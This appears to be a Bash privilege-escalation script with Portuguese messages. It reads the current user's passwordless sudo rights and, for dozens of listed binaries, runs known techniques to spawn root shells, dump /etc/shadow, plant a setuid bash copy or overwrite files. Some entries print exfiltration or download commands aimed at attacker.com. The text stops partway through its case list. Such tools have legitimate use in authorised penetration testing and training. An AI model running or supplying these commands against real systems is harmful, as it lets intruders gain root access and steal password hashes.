#!/bin/bash
echo -e "\e[1;35m"
cat << "EOF"
               _       
 ___ _   _  __| | ___  
/ __| | | |/ _` |/ _ \ 
\__ \ |_| | (_| | (_) |
|___/\__,_|\__,_|\___/ 
                       
EOF
echo -e "\e[0m"

echo -e "\e[1;35m"
echo "[*] --------------- sudo -l ---------------"
echo "[*] [*] Verificando permissões sudo -l ...."
echo "[*] ---------------------------------------"
echo -e "\e[0m"

sudol=$(sudo -n -l 2>&1)
if [[ $? -ne 0 ]]; then
    echo "[-] 'sudo -n -l' falhou: $sudol"
    exit 1
fi

echo "$sudol" | grep -oP '(?<=NOPASSWD: ).*' | while read -r paths; do
    bina=$(basename "$paths")

    case "$bina" in
        7z)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" a -ttar -an -so /etc/shadow | "$paths" e -ttar -si -so
            ;;
        aa-exec)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ab)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "URL=http://attacker.com/"
            echo "LFILE=file_to_send"
            echo "sudo ab -p $LFILE $URL"
            ;;
        alpine)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -F /etc/shadow
            ;;
        ansible-playbook)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
            sudo "$paths" $TF
            ;;
        ansible-test)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" shell
            ;;
        aoss)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        apache2ctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c "Include /etc/shadow" -k stop
            ;;
        apt-get)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
            ;;
        apt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" update -o APT::Update::Pre-Invoke::=/bin/sh
            ;;
        ar)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -u)
            LFILE=/etc/shadow
            sudo "$paths" r "$TF" "$LFILE"
            cat "$TF"
            ;;
        aria2c)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -p
            cmd='id'
            TF=$(mktemp)
            echo "$cmd" > $TF
            chmod +x $TF
            sudo "$paths" --on-download-error=$TF http://x
            ;;
        arj)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "TF=$(mktemp -d)"
            echo "LFILE=file_to_write"
            echo "LDIR=where_to_write"
            echo "echo DATA >"$TF/$LFILE""
            echo "arj a "$TF/a" "$TF/$LFILE""
            echo "sudo arj e "$TF/a" $LDIR"
            ;;
        arp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -v -f /etc/shadow
            ;;
        as)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" @$LFILE
            ;;
        ascii-xfr)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -ns /etc/shadow
            ;;
        ascii85)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        ash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        aspell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow
            ;;
        at)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo "$paths" now; tail -f /dev/null
            ;;
        atobm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow 2>&1 | awk -F "'" '{printf "%s", $2}'
            ;;
        awk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        aws)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        base32)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        base58)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        base64)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        basenc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --base64 /etc/shadow | "$paths" -d --base64
            ;;
        basez)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow | "$paths" --decode
            ;;
        bash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        batcat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --paging always /etc/profile
            !/bin/sh
            ;;
        bc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -s /etc/shadow
            quit
            ;;
        bconsole)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            @exec /bin/sh
            ;;
        bpftrace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas possiveis):"
            sudo "$paths" -e 'BEGIN {system("/bin/sh");exit()}'
            ;;
        bridge)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -b /etc/shadow
            ;;
        bundle)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        bundler)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        busctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
            ;;
        busybox)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" sh
            ;;
        byebug)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'system("/bin/sh")' > $TF
            sudo "$paths" $TF
            continue
            ;;
        bzip2)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c /etc/shadow | "$paths" -d
            ;;
        c89)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        c99)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        cabal)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec -- /bin/sh
            ;;
        capsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --
            ;;
        cat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        cdist)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" shell -s /bin/sh
            ;;
        certbot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            sudo "$paths" certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
            ;;
        check_by_ssh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
            ;;
        check_cups)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_log)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "INPUT=input_file"
            echo "sudo check_log -F $INPUT -O $LFILE"
            ;;
        check_memory)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_raid)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" --extra-opts=@$LFILE
            ;;
        check_ssl_cert)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd=id
            out=output_file
            TF=$(mktemp)
            echo "$cmd | tee $out" > $TF
            chmod +x $TF
            umask 022
            "$paths" --curl-bin $TF -H example.net
            cat $out
            ;;
        check_statusfile)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        chmod)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_change"
            echo "sudo chmod 6777 $LFILE"
            ;;
        choom)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -n 0 /bin/sh
            ;;
        chown)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_change"
            echo "sudo chown $(id -un):$(id -gn) $LFILE"
            ;;
        chroot)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /
            ;;
        clamscan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            TF=$(mktemp -d)
            touch $TF/empty.yara
            sudo "$paths" --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
            ;;
        cmp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/zero -b -l
            ;;
        cobc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
            sudo "$paths" -xFj --frelax-syntax-checks $TF/x
            ;;
        column)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        comm)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow /dev/null 2>/dev/null
            ;;
        composer)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
            sudo "$paths" --working-dir=$TF run-script x
            ;;
        cowsay)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec "/bin/sh";' >$TF
            sudo "$paths" -f $TF x
            ;;
        cowthink)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo 'exec "/bin/sh";' >$TF
            sudo "$paths" -f $TF x
            ;;
        cp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Possui 3 tecnicas):"
            echo "LFILE=file_to_write"
            echo "echo "DATA" | sudo cp /dev/stdin "$LFILE""
            ;;
        cpan)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ! exec '/bin/bash'
            ;;
        cpio)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Possui 3 tecnicas):"
            echo '/bin/sh </dev/tty >/dev/tty' >localhost
            sudo "$paths" -o --rsh-command /bin/sh -F localhost:
            ;;
        cpulimit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -l 100 -f /bin/sh
            ;;
        crash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -h
            !sh
            ;;
        crontab)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e
            ;;
        csh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        csplit)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow 1
            cat xx01
            ;;
        csvtool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" call '/bin/sh;false' /etc/passwd
            ;;
        cupsfilter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i application/octet-stream -m application/octet-stream /etc/shadow
            ;;
        curl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
            echo "sudo curl $URL -o $LFILE"
            ;;
        cut)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -d "" -f1 /etc/shadow
            ;;
        dash)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        date)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        dc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e '!/bin/sh'
            ;;
        dd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "echo "data" | sudo dd of=$LFILE"
            ;;
        debugfs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        dialog)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --textbox /etc/shadow 0 0
            ;;
        diff)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --line-format=%L /dev/null /etc/shadow
            ;;
        dig)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        distcc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        dmesg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -H
            !/bin/sh
            ;;
        dmidecode)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "make dmiwrite"
            echo "TF=$(mktemp)"
            echo "echo "DATA" > $TF"
            echo "./dmiwrite $TF x.dmi"
            echo "LFILE=file_to_write"
            echo "sudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE""
            ;;
        dmsetup)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" create base <<EOF
            0 3534848 linear /dev/loop0 94208
EOF
            sudo "$paths" ls --exec '/bin/sh -s'
            ;;
        dnf)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'id' > $TF/x.sh
            fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
            sudo "$paths" install -y x-1.0-1.noarch.rpm
            ;;
        docker)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" run -v /:/mnt --rm -it alpine chroot /mnt sh
            ;;
        dosbox)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE='\path\to\file_to_write'"
            echo "sudo dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit"
            ;;
        dotnet)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo "$paths" fsi"
            echo "System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;"
            ;;
        dpkg)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (Temos 2 tecnicas):"
            sudo "$paths" -l
            !/bin/sh
            ;;
        dstat)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
            sudo "$paths" --xxx
            ;;
        dvips)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            tex '\special{psfile="`/bin/sh 1>&0"}\end'
            sudo "$paths" -R0 texput.dvi
            ;;
        easy_install)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
            sudo "$paths" $TF
            ;;
        eb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" logs
            !/bin/sh
            ;;
        ed)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        efax)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -d /etc/shadow
            ;;
        elvish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        emacs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -Q -nw --eval '(term "/bin/sh")'
            ;;
        enscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null -qo /dev/null -I '/bin/sh >&2'
            ;;
        env)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        eqn)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        espeak)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -qXf /etc/shadow
            ;;
        ex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        exiftool)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "LFILE=file_to_write"
            echo "INPUT=input_file"
            echo "sudo exiftool -filename=$LFILE $INPUT"
            ;;
        expand)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        expect)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c 'spawn /bin/sh;interact'
            ;;
        facter)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp -d)
            echo 'exec("/bin/sh")' > $TF/x.rb
            sudo FACTERLIB=$TF "$paths"
            ;;
        file)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        find)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" . -exec /bin/sh \; -quit
            ;;
        fish)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        flock)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -u / /bin/sh
            ;;
        fmt)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -999 /etc/shadow
            ;;
        fold)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -w99999999 /etc/shadow
            ;;
        fping)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow
            ;;
        ftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        gawk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" 'BEGIN {system("/bin/sh")}'
            ;;
        gcc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -wrapper /bin/sh,-s .
            ;;
        gcloud)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" help
            !/bin/sh
            ;;
        gcore)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "Verifique os processos"
            echo "sudo gcore $PID"
            ;;
        gdb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -nx -ex '!sh' -ex quit
            ;;
        gem)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" open -e "/bin/sh -c /bin/sh" rdoc
            ;;
        genie)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '/bin/sh'
            ;;
        genisoimage)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q -o - /etc/shadow
            ;;
        ghc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'System.Process.callCommand "/bin/sh"'
            ;;
        ghci)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "sudo ghci"
            echo "System.Process.callCommand "/bin/sh""
            ;;
        gimp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
            ;;
        ginsh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        git)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Temos diversas tecnicas. Testando:"
            sudo PAGER='sh -c "exec sh 0<&1"' "$paths" -p help
            ;;
        grc)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --pty /bin/sh
            ;;
        grep)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '' /etc/shadow
            ;;
        gtester)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            TF=$(mktemp)
            echo '#!/bin/sh' > $TF
            echo 'exec /bin/sh 0<&1' >> $TF
            chmod +x $TF
            sudo "$paths" -q $TF
            ;;
        gzip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f /etc/shadow -t
            ;;
        hd)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        head)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c1G /etc/shadow
            ;;
        hexdump)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -C /etc/shadow
            ;;
        highlight)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --no-doc --failsafe /etc/shadow
            ;;
        hping3)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths"
            /bin/sh
            ;;
        iconv)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -f 8859_1 -t 8859_1 /etc/shadow
            ;;
        iftop)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        install)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cp /bin/bash /tmp/bsuid
            sudo "$paths" -m 6777 /tmp/bsuid /tmp/rsh
            /tmp/rsh -p
            rm -f /tmp/bsuid
            ;;
        ionice)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /bin/sh
            ;;
        ip)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 3 tecnicas):"
            sudo "$paths" -force -batch /etc/shadow
            ;;
        irb)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            exec '/bin/bash'
            ;;
        ispell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/passwd
            !/bin/sh
            ;;
        jjs)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()" | sudo $paths
            ;;
        joe)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ^K!/bin/sh
            ;;
        join)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -a 2 /dev/null /etc/shadow
            ;;
        journalctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            !/bin/sh
            ;;
        jq)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -Rr . /etc/shadow
            ;;
        jrunscript)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e "exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')"
            ;;
        jtag)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --interactive
            shell /bin/sh
            ;;
        julia)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'run(`/bin/sh`)'
            ;;
        knife)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" exec -E 'exec "/bin/sh"'
            ;;
        ksh)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths"
            ;;
        ksshell)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -i /etc/shadow
            ;;
        ksu)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -q -e /bin/sh
            ;;
        kubectl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "LFILE=dir_to_serve"
            echo "sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
            ;;
        latex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando (existem 2 tecnicas):"
            sudo "$paths" --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
            ;;
        latexmk)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'exec "/bin/sh";'
            ;;
        ld.so)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /lib/ld.so /bin/sh
            ;;
        ldconfig)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "TF=$(mktemp -d)"
            echo "echo "$TF" > "$TF/conf""
            echo "# move malicious libraries in $TF"
            echo "sudo ldconfig -f "$TF/conf""
            ;;
        less)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/profile
            !/bin/sh
            ;;
        lftp)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -c '!/bin/sh'
            ;;
        links)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /etc/shadow
            ;;
        ln)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -fs /bin/sh /bin/ln
            sudo "$paths"
            ;;
        loginctl)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" user-status
            !/bin/sh
            ;;
        logsave)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" /dev/null /bin/sh -i
            ;;
        look)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" '' /etc/shadow
            ;;
        ltrace)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -b -L /bin/sh
            ;;
        lua)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -e 'os.execute("/bin/sh")'
            ;;
        lualatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -shell-escape '\documentclass{article}\begin{document}\directlua{os.execute("/bin/sh")}\end{document}'
            ;;
        luatex)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" -shell-escape '\directlua{os.execute("/bin/sh")}\end'
            ;;
        lwp-download)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Teste:"
            echo "URL=http://attacker.com/file_to_get"
            echo "LFILE=file_to_save"
            echo "sudo lwp-download $URL $LFILE"
            ;;
        lwp-request)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            LFILE=/etc/shadow
            sudo "$paths" "file://$LFILE"
            ;;
        mail)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" --exec='!/bin/sh'
            ;;
        make)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            cmd='/bin/sh'
            sudo "$paths" -s --eval=$'x:\n\t-'"$cmd"
            ;;
        man)
            echo "[+] Encontrado sudo NOPASSWD com "$paths" → Testando:"
            sudo "$paths" man
            !/bin/sh
            ;;
